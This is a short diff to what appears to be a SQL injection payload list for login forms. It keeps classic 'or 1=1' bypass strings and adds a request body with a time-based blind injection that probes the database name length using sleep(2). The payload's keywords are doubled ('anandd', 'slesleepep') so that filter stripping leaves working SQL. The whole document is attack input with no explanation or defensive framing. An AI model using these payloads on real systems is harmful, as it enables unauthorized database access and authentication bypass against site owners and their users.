@@ -1,3 +1,4 @@
 1' or 1=1
 1" or 1=1
 admin
+username=admin' anandd iiff (length(database())=*,slesleepep(2),1)#&password=admin
